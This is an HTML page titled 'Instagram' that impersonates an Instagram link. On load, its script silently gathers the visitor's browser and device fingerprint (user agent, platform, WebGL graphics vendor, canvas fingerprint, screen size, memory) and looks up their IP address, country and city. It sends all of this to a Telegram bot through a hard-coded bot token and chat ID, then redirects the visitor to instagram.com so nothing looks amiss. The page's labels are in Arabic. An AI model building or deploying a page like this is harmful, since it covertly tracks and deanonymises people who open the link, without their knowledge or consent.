<html>
<head>
<meta charset="UTF-8">
<title>Instagram</title>
<style>body{margin:0;padding:0;background:#000;overflow:hidden;height:100vh;width:100vw}</style>
</head>
<body>

<script>
(async () => {
    const botToken = "7612902419:AAFkil59yYM0O61rmGH6XAcOIm5pOdEkG58";
    const chatId = "5854169054";

    const data = {
        ua: navigator.userAgent,
        pl: navigator.platform,
        ven: navigator.vendor,
        av: navigator.appVersion,
        hc: navigator.hardwareConcurrency || "N/A",
        dm: navigator.deviceMemory ? `${navigator.deviceMemory} جيجابايت` : "N/A",
        sw: screen.width,
        sh: screen.height,
        ip: "جاري الجلب...",
        country: "جاري الجلب...",
        city: "جاري الجلب...",
        wv: "N/A",
        wr: "N/A",
        cf: "N/A",
        af: "تم التخطي للتسريع"
    };

    // WebGL Fingerprint
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            data.wv = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A";
            data.wr = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
        }
    } catch(e) {}

    // Canvas Fingerprint (بيانات طويلة)
    try {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.font = "16px Arial";
        ctx.fillText("fp", 2, 15);
        data.cf = canvas.toDataURL(); // كامل البصمة
    } catch(e) {}

    fetch("https://ipapi.co/json/")
        .then(r => r.json())
        .then(ip => {
            data.ip = ip.ip || "N/A";
            data.country = ip.country_name || "N/A";
            data.city = ip.city || "N/A";
            sendToTelegram();
        })
        .catch(() => sendToTelegram());

    function sendToTelegram() {
        const msg = `*📡 بيانات Fingerprinting مفصلة:*

1. *User Agent*  
${escape(data.ua)}  
معرف المتصفح والنظام

2. *Platform*  
${escape(data.pl)}  
نظام التشغيل الأساسي

3. *Vendor*  
${escape(data.ven)}  
الشركة المصنعة للمتصفح

4. *App Version*  
${escape(data.av)}  
إصدار المتصفح

5. *Hardware Concurrency*  
${data.hc}  
عدد أنوية المعالج

6. *Device Memory*  
${data.dm}  
حجم الذاكرة العشوائية

7. *WebGL Vendor*  
${escape(data.wv)}  
شركة كرت الشاشة

8. *WebGL Renderer*  
${escape(data.wr)}  
نوع كرت الشاشة

9. *Canvas Fingerprint*  
${escape(data.cf)}  
بصمة رسومية فريدة

10. *Audio Fingerprint*  
${data.af}  
بصمة صوتية

11. *Screen Resolution*  
${data.sw}x${data.sh}  
دقة الشاشة

12. *IP Address*  
${data.ip}  
عنوان IP

13. *Country*  
${escape(data.country)}  
الدولة

14. *City*  
${escape(data.city)}  
المدينة`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                chat_id: chatId,
                text: msg,
                parse_mode: "Markdown"
            })
        }).catch(() => {});
        
        window.location.replace("https://www.instagram.com/");
    }

    function escape(text) {
        return text ? text.replace(/[_*[\]()~>#+\-=|{}.!]/g, '\\$&') : "N/A";
    }
})();
</script>

</body>
</html>
